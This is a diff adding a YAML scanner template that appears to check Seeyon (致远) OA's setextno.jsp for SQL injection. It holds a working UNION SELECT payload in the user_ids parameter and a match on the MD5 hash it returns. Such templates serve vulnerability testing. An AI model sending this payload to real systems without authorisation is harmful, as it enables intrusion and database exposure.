@@ -1,0 +1,11 @@
+name: 致远OA-setextno-jsp-sql
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17)%20union%20all%20select%201,2,@@version,md5(12345)%23
+    expression:
+      status: 200
+      body_all: ["827ccb0eea8a706c4c34a16891f84e7b"] 
